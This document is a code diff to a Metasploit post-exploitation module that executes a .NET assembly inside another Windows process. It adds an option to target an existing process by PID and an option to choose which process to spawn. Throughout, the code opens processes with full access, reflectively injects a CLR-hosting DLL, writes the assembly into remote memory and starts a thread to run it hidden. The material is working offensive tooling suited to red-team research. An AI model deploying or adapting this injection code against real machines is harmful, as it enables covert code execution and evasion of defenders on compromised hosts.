@@ -36,14 +36,41 @@ class MetasploitModule < Msf::Post
     register_options(
       [
         OptString.new('ASSEMBLY', [true, 'Assembly file name']),
-        OptString.new('ASSEMBLYPATH', [false, 'Assembly directory']),
+        OptPath.new('ASSEMBLYPATH', [false, 'Assembly directory',
+                                     ::File.join(Msf::Config.data_directory, 
+                                                 'execute-assembly')]),
         OptString.new('ARGUMENTS', [false, 'Command line arguments']),
-        OptInt.new('WAIT', [false, 'Time in seconds to wait', 10])
+	OptString.new('PROCESS', [false, 'Process to spawn','notepad.exe']),
+        OptInt.new('PID', [false, 'Pid  to inject', 0]),
+	OptInt.new('WAIT', [false, 'Time in seconds to wait', 10])
       ], self.class
     )
   end
 
   def run
+    exe_path = gen_exe_path
+    assembly_size = File.size(exe_path)
+    client.response_timeout=20
+    params_size = if datastore['ARGUMENTS'].nil?
+                    0
+                  else
+                    datastore['ARGUMENTS'].length
+                  end
+
+    if assembly_size <= 1_024_000 && params_size <= 1_024
+      execute_assembly(exe_path)
+    else
+      if assembly_size > 1_024_000
+        print_bad("Assembly max size 1024k actual file size #{assembly_size}")
+      end
+      if params_size > 1024
+        print_bad('Parameters max lenght 1024 actual parameters length' \
+                  "#{params_size}")
+      end
+    end
+  end
+
+  def gen_exe_path
     exe_path = if datastore['ASSEMBLYPATH'] == '' ||
                   datastore['ASSEMBLYPATH'].nil?
                  ::File.join(Msf::Config.data_directory, 'execute-assembly',
@@ -52,67 +79,108 @@ class MetasploitModule < Msf::Post
                  ::File.join(datastore['ASSEMBLYPATH'], datastore['ASSEMBLY'])
                end
     exe_path = ::File.expand_path(exe_path)
+    exe_path
+  end
 
-    assembly_size = File.size(exe_path)
-    params_size = if datastore['ARGUMENTS'].nil?
-                    0
-                  else
-                    datastore['ARGUMENTS'].length
-                  end
+  def sanitize_process_name(process_name)
+    out_process_name = if process_name.split(//).last(4).join.eql? '.exe'
+                         process_name
+                       else
+                         process_name + '.exe' 
+                       end
+    out_process_name
+  end
 
-    if assembly_size <= 1_024_000 && params_size <= 1_024
+  def pid_exists(pid)
+    return true
+  end
 
-      print_status('Launching notepad to host CLR...')
-      notepad_process = client.sys.process.execute('notepad.exe', nil,
-                                                   'Channelized' => true,
-                                                   'Hidden' => true)
-      process = client.sys.process.open(notepad_process.pid,
-                                        PROCESS_ALL_ACCESS)
-      print_good("Process #{process.pid} launched.")
+  def launch_process
+    process_name = sanitize_process_name(datastore['PROCESS'])
+    print_status("Launching #{process_name} to host CLR...")
+    process = client.sys.process.execute(process_name, nil,
+                                                 'Channelized' => true,
+                                                 'Hidden' => true)
+    hprocess = client.sys.process.open(process.pid,
+                                      PROCESS_ALL_ACCESS)
+    print_good("Process #{hprocess.pid} launched.")
+    [process, hprocess]
+  end
 
-      print_status("Reflectively injecting the Host DLL into #{process.pid}..")
+  def inject_hostclr_dll(process)
+    print_status("Reflectively injecting the Host DLL into #{process.pid}..")
 
-      library_path = ::File.join(Msf::Config.data_directory,
-                                 'execute-assembly', 'HostingCLRx64.dll')
-      library_path = ::File.expand_path(library_path)
+    library_path = ::File.join(Msf::Config.data_directory,
+                               'execute-assembly', 'HostingCLRx64.dll')
+    library_path = ::File.expand_path(library_path)
 
-      print_status("Injecting Host into #{process.pid}...")
-      exploit_mem, offset = inject_dll_into_process(process, library_path)
+    print_status("Injecting Host into #{process.pid}...")
+    exploit_mem, offset = inject_dll_into_process(process, library_path)
+    [exploit_mem, offset]
+  end
 
-      print_status("Host injected. Copy assembly into #{process.pid}...")
-      assembly_mem = process.memory.allocate(1_025_024, PAGE_READWRITE)
- 
-      params = if datastore['ARGUMENTS'].nil?
-                 ''
-               else
-                 datastore['ARGUMENTS']
-               end
-      params += ("\x00" * (1024 - params.length))
+  def hook_process
+    print_status('Warning: output unavailable')
+    print_status("Hooking #{datastore['PID']} to host CLR...")
+    hprocess = client.sys.process.open(datastore['PID'],
+                                      PROCESS_ALL_ACCESS)
+    print_good("Process #{hprocess.pid} hooked.")
+    [nil, hprocess]
+  end
 
-      process.memory.write(assembly_mem, params + File.read(exe_path))
+  def execute_assembly(exe_path)
+    process, hprocess = if datastore['PID'] <= 0
+                          launch_process
+                        else
+                          hook_process
+                        end
+    exploit_mem, offset = inject_hostclr_dll(hprocess)
 
-      print_status('Assembly copied. Executing...')
-      process.thread.create(exploit_mem + offset, assembly_mem)
+    assembly_mem = copy_assembly(exe_path, hprocess)
 
-      sleep(datastore['WAIT'])
+    print_status('Executing...')
+    hprocess.thread.create(exploit_mem + offset, assembly_mem)
 
-      print_status('Start reading output')
-      output = notepad_process.channel.read
-      output.split("\n").each { |x| print_good(x) }
-      print_status('End output.')
-
-      print_good("Killing process #{process.pid}")
-      process.kill(process.pid)
-      print_good('Execution finished.')
-    else
-      if assembly_size > 1_024_000
-        print_bad("Assembly max size 1024k actual file size #{assembly_size}")
-      end
-
-      if params_size > 1024
-        print_bad('Parameters max lenght 1024 actual parameters length' \
-                  "#{params_size}")
-      end
+    sleep(datastore['WAIT'])
+    
+    if datastore['PID'] <= 0
+      read_output(process)
+      print_good("Killing process #{hprocess.pid}")
+      hprocess.kill(hprocess.pid)
     end
+
+    print_good('Execution finished.')
+  end
+
+  def copy_assembly(exe_path, process)
+    print_status("Host injected. Copy assembly into #{process.pid}...")
+    assembly_mem = process.memory.allocate(1_025_024, PAGE_READWRITE)
+
+    params = if datastore['ARGUMENTS'].nil?
+               ''
+             else
+               datastore['ARGUMENTS']
+             end
+    params += ("\x00" * (1024 - params.length))
+
+    process.memory.write(assembly_mem, params + File.read(exe_path))
+
+    print_status('Assembly copied.')
+    assembly_mem
+  end
+
+  def read_output(process)
+    print_status('Start reading output')
+    begin
+      loop do 
+        output = process.channel.read 
+        output.split("\n").each { |x| print_good(x) }
+        break if output.length == 0
+      end
+    rescue ::Exception => e
+      #print_status("Error running assemply: #{e.class} #{e}")
+    end
+
+    print_status('End output.')
   end
 end
